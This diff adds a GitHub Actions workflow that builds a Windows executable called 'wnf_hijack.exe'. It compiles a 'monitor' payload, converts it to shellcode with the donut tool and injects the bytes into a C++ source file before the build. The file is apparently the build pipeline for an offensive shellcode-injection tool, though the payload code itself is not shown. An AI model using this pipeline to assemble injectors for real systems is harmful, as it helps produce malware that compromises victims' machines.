@@ -1,0 +1,54 @@
+name: Build Windows EXE
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Setup Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.11'
+
+    - name: Download donut
+      run: |
+        curl -L https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -o donut.zip
+        unzip donut.zip -d donut
+        echo "${{ github.workspace }}/donut" >> $env:GITHUB_PATH
+
+    - name: Build custom payload and inject into framework
+      run: |
+        if (Test-Path "payload/monitor.cpp") {
+          cl /EHsc /MT /O2 payload/monitor.cpp /Fe:monitor.exe /link user32.lib
+          donut -i monitor.exe -o shellcode.bin
+          python -c "
+import re
+with open('shellcode.bin', 'rb') as f:
+    data = f.read()
+hex_str = ', '.join(f'0x{b:02x}' for b in data)
+new_payload = f'unsigned char g_payload[] = {{{hex_str}}};'
+with open('src/sa.cpp', 'r') as f:
+    content = f.read()
+content = re.sub(r'unsigned char g_payload\[\] = \{.*?\};', new_payload, content, flags=re.DOTALL)
+with open('src/sa.cpp', 'w') as f:
+    f.write(content)
+"
+
+    - name: Configure CMake
+      run: cmake -B build -G "Visual Studio 17 2022" -A x64
+
+    - name: Build Release
+      run: cmake --build build --config Release
+
+    - name: Upload Artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: wnf_hijack.exe
+        path: build/Release/wnf_hijack.exe
